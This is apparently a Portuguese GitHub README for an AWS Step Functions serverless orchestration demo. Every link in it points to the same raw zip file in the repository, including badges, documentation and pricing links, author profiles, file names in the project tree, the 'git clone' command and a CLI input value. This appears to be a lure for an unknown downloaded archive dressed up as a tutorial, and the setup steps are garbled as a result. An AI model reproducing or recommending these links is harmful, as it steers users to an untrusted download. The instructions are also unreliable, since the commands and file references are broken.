# 🚀 AWS Step Functions: Serverless Orchestration Demo

<div align="center">

[![AWS](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip%20Functions-FF9900?style=flat&logo=amazon-aws)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
[![Python](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
[![License](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](LICENSE)
[![GitHub](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)

**Orquestração serverless com AWS Step Functions integrando Lambda, S3, DynamoDB, API Gateway e SNS.**

[Features](#-features) • [Arquitetura](#-arquitetura) • [Guia Rápido](#-guia-rápido) • [Tecnologias](#-tecnologias)

</div>

---

## 📋 Visão Geral

Este projeto demonstra como usar **AWS Step Functions** para orquestrar um workflow serverless complexo com:

✅ **Execução paralela** de múltiplos serviços AWS  
✅ **Tratamento de erros** robusto com fallback  
✅ **Integração nativa** com Lambda, S3, DynamoDB e SNS  
✅ **Infrastructure as Code** com AWS SAM  
✅ **Pronto para produção** com boas práticas  

---

## 🏗️ Arquitetura

```
┌─────────────────────────────────────────────────────────────┐
│                       Step Functions                         │
│                   (Orquestração Serverless)                 │
└─────────────────────────────────────────────────────────────┘
                              ↓
                       Process Data
                      (Lambda Function)
                              ↓
                    ┌─────────┴─────────┐
                    ↓                   ↓
            ┌───────────────────────────────┐
            │   Parallel Execution          │
            └───────────────────────────────┘
        ↓              ↓              ↓
    Write to S3   DynamoDB      API Gateway
                   Insert         Invoke
        ↓              ↓              ↓
            ┌───────────────────────────────┐
            │     Error Handling (Catch)    │
            └───────────────────────────────┘
                         ↓
                   Finalize Lambda
                    (Consolidate)
                         ↓
                    SNS Publish
                   (Notificação)
                         ↓
                      End
```

---

## 🎯 Features

### Core Features
- **State Machine Serverless**: Workflow visual e declarativo
- **Execução Paralela**: Processa S3, DynamoDB e API Gateway simultaneamente
- **Error Handling**: Captura e trata erros com fallback automático
- **Infrastructure as Code**: Deploy com `sam deploy`
- **Integração Nativa**: Sem código "cola" entre serviços

### Serviços AWS Integrados
| Serviço | Função | Endpoint |
|---------|--------|----------|
| **Lambda** | Processamento de dados | ProcessData, Finalize, HandleError |
| **S3** | Armazenamento de output | `s3://stepfunctions-demo-bucket-{account}/output/` |
| **DynamoDB** | Persistência estruturada | `stepfunctions-demo-table` |
| **API Gateway** | Invocações HTTP | `/process` (POST) |
| **SNS** | Notificações | `stepfunctions-demo-notifications` |

---

## 📂 Estrutura do Projeto

```
aws-stepfunctions-serverless-orchestration-demo/
├── 📄 https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                          # Este arquivo
├── 📄 .gitignore                         # Exclusões Git (Python)
│
├── infra/                                # Infrastructure as Code
│   ├── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip             # State Machine Definition
│   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                     # AWS SAM Template
│
├── src/                                  # Código das Lambdas
│   ├── process-data/
│   │   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Valida/enriquece dados
│   ├── finalize/
│   │   └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Consolida resultados
│   └── handle-error/
│       └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Tratamento de erros
│
└── events/                               # Eventos de Teste
    └── https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip                        # Payload de exemplo
```

---

## ⚙️ Como Funciona

### 1️⃣ **Entrada**
```json
{
  "id": "demo-123",
  "source": "step-functions-demo",
  "value": 42
}
```

### 2️⃣ **Processamento**
- Lambda `ProcessData` valida e enriquece os dados
- Executa 3 branches **paralelos**:
  - ✍️ Escreve em **S3** (`output/{id}.json`)
  - 📦 Insere em **DynamoDB** (table: `stepfunctions-demo-table`)
  - 🔗 Invoca **API Gateway** (POST `/process`)

### 3️⃣ **Consolidação**
- Lambda `Finalize` recebe array com resultados paralelos
- Consolida em single response

### 4️⃣ **Notificação**
- SNS publica resultado final em `stepfunctions-demo-notifications`
- Subscribers (emails, webhooks) recebem notificação

### ⚠️ **Tratamento de Erro**
- Qualquer falha dispara `HandleError` Lambda
- Logs via CloudWatch
- Fluxo continua até notificação (resiliente)

---

## 🚀 Guia Rápido

### Pré-requisitos
```bash
✅ AWS Account com credenciais configuradas
✅ AWS SAM CLI instalado (v1.37+)
✅ Python 3.11+
✅ Git
```

### 1. Clone o Repositório
```bash
git clone https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip
cd aws-stepfunctions-serverless-orchestration-demo
```

### 2. Build com SAM
```bash
sam build
```

### 3. Deploy (Guided)
```bash
sam deploy --guided
```

**Responda os prompts:**
- `Stack Name`: seu-stack-name
- `Region`: us-east-1 (ou sua região)
- `Confirm changes before deploy`: Y
- `Allow SAM CLI IAM role creation`: Y

### 4. Teste o Workflow

#### Opção A: AWS Console (Recomendado)
1. Abra AWS Step Functions Console
2. Selecione sua state machine
3. Clique "Start execution"
4. Cole o input:
```json
{
  "id": "test-001",
  "source": "manual-test",
  "value": 42
}
```
5. Monitore em tempo real ✨

#### Opção B: AWS CLI
```bash
aws stepfunctions start-execution \
  --state-machine-arn "arn:aws:states:us-east-1:ACCOUNT_ID:stateMachine:stepfunctions-demo" \
  --input https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip
```

---

## 🛠️ Tecnologias

### Cloud Services
- **AWS Step Functions** - Orquestração serverless
- **AWS Lambda** - Computação serverless
- **Amazon S3** - Object storage
- **Amazon DynamoDB** - NoSQL database
- **Amazon API Gateway** - HTTP endpoints
- **Amazon SNS** - Pub/Sub messaging
- **AWS CloudWatch** - Logging & monitoring

### Infrastructure & Tools
- **AWS SAM** - Serverless Application Model
- **CloudFormation** - IaC
- **Python 3.11** - Runtime
- **Git** - Version control

---

## 📊 Monitoramento

### CloudWatch Logs
```bash
# Ver logs de uma execução
aws logs tail /aws/lambda/ProcessDataFunction --follow
aws logs tail /aws/lambda/FinalizeFunctionwhere --follow
```

### Métricas Step Functions
- Tempo total de execução
- Taxa de sucesso/falha
- Tempo por estado

### X-Ray Tracing (Opcional)
Altere `https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip`:
```yaml
TracingConfig:
  Mode: Active
```

---

## 💰 Custo Estimado (mensal)

| Serviço | Uso | Custo |
|---------|-----|-------|
| Step Functions | 10.000 execuções | ~$2.50 |
| Lambda | 30.000 invocações | ~$0.60 |
| S3 | 1 GB stored | ~$0.02 |
| DynamoDB | 1M RCU/WCU | Variável |
| API Gateway | 1M requests | ~$3.50 |
| SNS | 1M publishes | ~$0.50 |
| **Total** | | **~$7-10** |

*Nota: Inclui free tier. Consulte [AWS Pricing](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip) para detalhes.*

---

## 🔒 Segurança

✅ **IAM Roles**: Least privilege por Lambda  
✅ **VPC (Opcional)**: Configure em `https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip`  
✅ **Encryption**: S3 SSE, DynamoDB encryption habilitados  
✅ **API Gateway**: Adicione API Keys/WAF  
✅ **Logging**: CloudWatch + X-Ray tracing  

---

## 📚 Recursos Úteis

- [AWS Step Functions Docs](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
- [State Machine Example](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
- [AWS SAM Guide](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
- [Lambda Best Practices](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)

---

## 🤝 Contribuindo

Gostou do projeto? Considere:

⭐ **Star** este repositório  
🔗 **Compartilhe** em suas redes  
💬 **Feedback** via Issues  
🚀 **PRs** são bem-vindas!  

---

## 📝 Licença

Este projeto é **MIT Licensed** - veja [LICENSE](LICENSE) para detalhes.

---

## 👤 Autor

**Luciano Gião**
- GitHub: [@LucianoHMG](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zip)
- LinkedIn: [Luciano Gião](https://raw.githubusercontent.com/LucianoHMG/aws-stepfunctions-serverless-orchestration-demo/main/src/handle-error/serverless_stepfunctions_demo_aws_orchestration_v1.1.zipão)
- AWS Certification: AWS Cloud Practitioner + Solutions Architect Associate

---

<div align="center">

### 🌟 Feito com ❤️ para a comunidade cloud

**[⬆ voltar ao topo](#-aws-step-functions-serverless-orchestration-demo)**

</div>
